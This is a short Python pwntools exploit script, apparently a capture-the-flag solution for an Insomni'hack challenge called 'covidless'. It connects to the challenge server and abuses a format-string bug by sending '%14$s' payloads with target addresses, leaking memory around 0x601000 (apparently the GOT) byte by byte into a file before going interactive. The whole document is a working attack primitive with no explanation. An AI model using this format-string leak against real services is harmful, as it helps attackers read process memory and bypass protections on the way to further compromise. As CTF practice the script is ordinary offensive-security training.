#!/usr/bin/env python2
from pwn import *

# Definitions
io = remote('covidless.insomnihack.ch',6666)

# Exploit
def pwn():
    with open('got','a') as f:
        addr = 0x601000
        while True:

            # Dumped entire bin
            if addr >= 0x601100:
                break

            log.success(hex(addr))
            raw_addr = p64(addr)

            # Ignore \n (printf)
            if '\n' in raw_addr:
                f.write('\x00')
                addr += 1
                continue

            # Send fmt
            io.recvrepeat(0.1)
            io.sendline('%14$s###########'+raw_addr)

            # Parse
            out = io.recvuntil('###########').split('###########')[0]+'\x00'
            out = out.split('Your covid pass is invalid : ')[1]
            out = out.split('###########')[0]+'\x00'
            io.recvrepeat(0.1)

            # Append and repeat
            l = len(out)
            if l == 0:
                f.write('\x00')
                addr += 1
            else:
                print('Leak: ' + hex(u64(out.ljust(8,'\x00'))))
                f.write(out)

                addr += l
     
pwn()
io.interactive()